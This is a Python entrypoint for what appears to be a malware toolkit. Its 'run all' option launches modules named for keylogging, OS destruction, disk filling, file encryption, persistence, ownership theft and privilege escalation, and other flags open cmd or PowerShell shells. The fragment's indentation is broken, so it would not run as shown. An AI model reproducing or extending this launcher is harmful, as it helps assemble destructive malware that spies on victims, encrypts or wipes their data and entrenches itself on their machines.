"""Compact entrypoint for the project"""

args = parser.parse_args()

    # Handle dry-run BEFORE importing or executing any project modules.
    if args.dry_run:
        planned = []

        if args.os_info:
            planned.append("get OS information")

        if args.start_terminal:
            planned.append("start terminal")

        if args.start_cmd:
            planned.append("start command shell")

        if args.start_powershell:
            planned.append("start PowerShell")

        if args.run_all:
            planned.append("run all configured modules")

        if args.module:
            for spec in args.module:
                planned.append(f"execute module {spec}")

        if not planned:
            planned.append("no project action")

        for action in planned:
            logger.info("Dry run: would %s", action)
            print(f"Dry run: would {action}")

        return

    # Normal execution starts here.
    if args.os_info:
        from platform_mod.platform_utils import get_os_type
        print(get_os_type())

    if args.start_terminal:
        from core.manager import TerminalManager
        TerminalManager().start_terminal()

    if args.start_cmd:
        from platform_mod.mycmd import start_cmd
        start_cmd()

    if args.start_powershell:
        from platform_mod.powershell import start_powershell
        start_powershell()

    if args.run_all:
        modules = [
            "collection.disk_fill",
            "collection.keylogger",
            "collection.os_destroyer",
            "core.background_runner",
            "core.base",
            "core.manager",
            "crypto.encryption_key_manager",
            "crypto.encryptor1",
            "persistence.keyboard_interrupt_suppress",
            "persistence.os_root_save",
            "persistence.ownership_steal",
            "platform_mod.android_shell_util",
            "platform_mod.elevate",
            "platform_mod.mycmd",
            "platform_mod.platform_utils",
            "platform_mod.powershell",
            "platform_mod.shells",
        ]

        for name in modules:
            run_module(name, function_name=args.function)

    if args.module:
        for spec in args.module:
            run_module(spec, function_name=args.function)
